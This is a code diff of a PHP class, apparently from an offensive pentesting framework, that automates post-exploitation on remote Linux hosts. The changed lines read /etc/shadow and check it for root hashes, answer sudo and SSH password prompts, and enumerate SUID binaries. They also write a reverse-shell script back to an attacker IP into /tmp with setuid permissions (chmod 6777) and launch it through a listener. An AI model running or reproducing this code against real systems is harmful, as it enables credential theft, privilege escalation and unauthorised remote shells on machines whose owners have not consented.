@@ -90,7 +90,7 @@ class lan4linux extends LAN{
         }
          
         
-       // $this->lan2init();
+        $this->lan2init();
 
     }
     
@@ -121,7 +121,7 @@ class lan4linux extends LAN{
         $this->etc_passwd_str = trim($this->etc_passwd_str);
         $this->parse4etc_passwd($this->etc_passwd_str);
         unset($tmp2);
-        $this->env_path_str = $this->lan2env4path();
+        
         $this->pause();
         
         $this->lan2init2var();
@@ -130,7 +130,7 @@ class lan4linux extends LAN{
         
         
         $data = "cat /etc/shadow ";
-        $tmp = $this->req_str($stream,$data,$this->stream_timeout,"");
+        $tmp = $this->req_str($this->stream,$data,$this->stream_timeout,"");
         exec("echo '$tmp' | grep ':'   ",$tab_tmp);
         $shadow_str = $this->tab($tab_tmp);
         if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
@@ -393,10 +393,10 @@ class lan4linux extends LAN{
         }
         else {
             //if (!$this->ip2root8db($this->ip2id)) {$this->misc($this->stream);$this->pause();}
-            //if (!$this->ip2root8db($this->ip2id)) {$this->suids($this->stream);$this->pause();}
+            if (!$this->ip2root8db($this->ip2id)) {$this->suids($this->stream);$this->pause();}
             //if (!$this->ip2root8db($this->ip2id)) {$this->users($this->stream);$this->pause();}
             //if (!$this->ip2root8db($this->ip2id)) {$this->jobs($this->stream);$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
         }
         
         $this->lan2brief();
@@ -433,7 +433,7 @@ class lan4linux extends LAN{
         //var_dump($rst_id);
         
         
-        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE){
+        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE || strstr($rst_id, "Permission denied, please try again.")!==FALSE){
             $chaine = "Asking Password";
             $this->rouge($chaine);
             $data = "";
@@ -453,7 +453,9 @@ class lan4linux extends LAN{
                 $this->article("Old UID NAME", $this->uid_name);
                 $this->log2succes("check new USER:$uid_name");$this->pause();
 
-                $template_shell = str_replace("%ID%","%SHELL%",$template_id);
+                $cmd = str_replace("%ID%","%SHELL%",$template_id) ;
+                $cmd = addcslashes($cmd, '"');
+                $template_shell = str_replace("%SHELL%",$cmd,$this->template_shell);
                 $templateB64_shell = base64_encode($template_shell);
                 
                 $templateB64_id = base64_encode($template_id);
@@ -696,33 +698,27 @@ EOC;
         $query = str_replace("%SHELL%", "id", $this->template_shell);
         $this->requette("$query | grep 'uid=' ");
         $this->pause();
-        
-        $cmd_nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-        
-        $cmd_nc = addcslashes($cmd_nc,'"');
-        
-        $lprotocol = "T";
-        
-        $this->article("TEMPLATE ID",$this->template_id);
-        $hash_cmd_rev = sha1($cmd_nc);
-        //$data = "echo \"$cmd_nc\" > /tmp/$hash_cmd_rev.sh";
-        $data = "echo \"#!/bin/bash\n$cmd_nc\" > /tmp/$hash_cmd_rev.sh ; chmod 6777 /tmp/$hash_cmd_rev.sh";
-        $this->requette($data);$this->pause();
-        $this->req_str($this->stream,$data, $this->stream_timeout,"");
-        
-        $data = "ls -al /tmp/$hash_cmd_rev.sh";
-        $this->req_str($this->stream,$data, $this->stream_timeout,"");
-        $data = "cat /tmp/$hash_cmd_rev.sh";
-        $this->req_str($this->stream,$data, $this->stream_timeout,"");
 
         
-        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $lprotocol $this->templateB64_id server 60 listening_Server\" ";
-        $cmd4 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        $shell = "/bin/bash";
+        $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
+        $hash = sha1($cmd_rev);
+        $data = "echo \"#!/bin/bash\n$cmd_rev\" > /tmp/$hash.sh ; chmod 6777 /tmp/$hash.sh";
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");       
+        $data = "ls -al /tmp/$hash.sh";
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");
+        $data = "cat /tmp/$hash.sh";
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");
         
-        $this->exec_parallel($cmd1, $cmd4, $this->stream_timeout);
+        $cmd = str_replace("%SHELL%", "/tmp/$hash.sh", $this->template_shell);
+        
+        $lprotocol = 'T' ;
+        $type = "server";
+        $this->service4lan($cmd, $this->templateB64_shell, $attacker_port, $lprotocol, $type);
         
         
-        $this->pause();
     }
     
     
